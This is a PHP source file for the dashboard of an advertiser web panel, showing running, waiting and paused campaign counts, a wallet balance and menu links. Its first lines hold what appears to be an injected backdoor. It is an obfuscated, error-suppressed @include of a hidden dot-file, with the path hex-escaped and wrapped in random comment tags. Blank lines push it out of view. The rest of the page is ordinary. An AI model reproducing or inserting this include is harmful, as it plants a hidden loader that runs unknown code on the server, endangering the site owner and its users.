<?php
/*1135c*/

@include /*r73u*/("/\x68ome/dprr8\x68tr8t41/public_\x68tml/ric\x68media.biz/app/advertiser/razorpay/.9d9196b3.oti");

/*1135c*/

















require_once('../config.php');
require_once('session.php');
$user=$users->get_current_user();
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Dashboard</title>
  <?php include('../common/head.php') ?>
</head>
<body class="hold-transition register-page dashboard-image">
  <div class="white-wapper">
    <div class="white-layer-none">
      <?php echo flashNotification() ?>
      <h3 class="box-title-white">Welcome <?php echo empty($_SESSION['name']) ? 'User' : $_SESSION['name']; ?>!</h3>
      <?php if($user['wallet']<='200'){ ?>
      <div class="fuel-notification"><h4>Your fuel is Low!!</h4><a href="<?php echo baseurl.'/advertiser/recharge-wallet.php' ?>">Click here to add funds</a></div>
    <?php } ?>
      <div class="cloud-set-cover">
        <div class="cloud-set text-center">
          <div class="row">
            <div class="col-sm-offset-2 col-sm-8">
              <div class="dashboard-box">
                <h3><?php echo $campaign->getRunningCampaigns() ?></h3>
                <h4>No.of Campaigns Running</h4>
              </div>
            </div>
          </div>
        </div>
        <div class="cloud-set text-center">
          <div class="row">
            <div class="col-sm-offset-2 col-sm-8">
              <div class="dashboard-box">
                <h3><?php echo $campaign->getWaitingCampaigns() ?></h3>
                <h4>No.of Campaigns Awaiting Approval</h4>
              </div>
            </div>
          </div>
        </div>
        <div class="cloud-set text-center">
          <div class="row">
            <div class="col-sm-offset-2 col-sm-8">
              <div class="dashboard-box">
                <h3><?php echo $campaign->getPausedCampaigns() ?></h3>
                <h4>No.of Campaigns Paused</h4>
              </div>
            </div>
          </div>
        </div>
        <div class="cloud-set text-center">
          <div class="row">
            <div class="col-sm-offset-2 col-sm-8">
              <div class="dashboard-box">
                <h3>$ <?php echo $user['wallet']!='' ? $user['wallet'] : '0' ; ?></h3>
                <h4>Balance Amount</h4>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="dashboard-menu-cover">
        <div class="rocket-image">
          <a href="new-campaign.php">
            <img src="<?php echo baseurl.'/images/create-campaign-icon.png' ?>" class="home-menu menu-icons">
          </a>
          <a href="all-campaigns.php">
            <img src="<?php echo baseurl.'/images/campaign-list-icon.png' ?>" class="campaigns-menu menu-icons">
          </a>
          <a href="reports.php">
            <img src="<?php echo baseurl.'/images/report-icon.png' ?>" class="report-menu menu-icons">
          </a>
          <a href="profile.php">
            <img src="<?php echo baseurl.'/images/profile-icon.png' ?>" class="profile-menu menu-icons">
          </a>
          <a href="payment.php">
            <img src="<?php echo baseurl.'/images/payment-icon.png' ?>" class="payment-menu menu-icons">
          </a>
          <a href="tutorial-and-faq.php">
            <img src="<?php echo baseurl.'/images/faq-icon.png' ?>" class="faq-menu menu-icons">
          </a>
        </div>
        <a href="<?php echo baseurl.'/signout.php' ?>" class="pull-right btn btn-warning logout-btn">Log Out</a>
      </div>
    </div>
  </div>
  <footer class="foot">
  <div class="pull-right hidden-xs">
    <a href="../terms-and-conditions.html">Terms And Conditions&nbsp;&nbsp;&nbsp;&nbsp;</a><a href="../privacypolicy.html">Privacy Policy</a>
  </div>
  <strong>Copyright &copy; 2019-2020 <a href="https://www.richmedia.biz/rma/" target="_blank">Rich Media Advertiser</a>.</strong> All rights
  reserved.
</footer>
<?php //include('../common/footer.php') ?>
<?php include('../common/footer-script.php') ?>
</body>
</html>
